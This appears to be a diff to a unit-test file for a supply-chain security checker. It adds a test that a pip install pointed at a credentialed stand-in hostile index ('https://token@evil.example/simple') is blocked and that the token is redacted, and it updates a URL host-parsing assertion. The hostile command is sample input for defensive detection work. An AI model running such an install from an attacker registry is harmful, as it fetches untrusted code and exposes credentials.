@@ -263,6 +263,25 @@ def test_pip_argument_parser_handles_editable_requirements_and_registry_edge_cas
 
 
 @pytest.mark.unit
+def test_credentialed_registry_url_still_reports_unexpected_host() -> None:
+    findings = evaluate_supply_chain_policy(
+        command_evidence=(
+            "$ pip install requests==2.32.3 "
+            "--index-url https://token@evil.example/simple\n"
+        ),
+        changed_paths=(),
+        owned_paths=(),
+        policy=_policy("block"),
+    )
+
+    assert [(finding.reason_code, finding.severity) for finding in findings] == [
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+    ]
+    assert findings[0].details["registry_hosts"] == ["evil.example"]
+    assert "token" not in str(findings[0].details["command_excerpt"])
+
+
+@pytest.mark.unit
 def test_command_parser_avoids_prose_healthcheck_and_markdown_false_positives() -> None:
     findings = evaluate_supply_chain_policy(
         command_evidence=(
@@ -323,7 +342,7 @@ def test_supply_chain_policy_for_workspace_defaults_to_warn_and_ignores_malforme
 
 @pytest.mark.unit
 def test_private_normalizers_cover_empty_and_bad_inputs_without_recording_secrets() -> None:
-    assert _host_from_url("https://token@pypi.org/simple") is None
+    assert _host_from_url("https://token@pypi.org/simple") == "pypi.org"
     assert _is_remote_fetch([]) is False
     assert _pipe_target_is_interpreter([]) is False
     assert _nested_dict({"security": {"supply_chain": {}}}, "security") == {
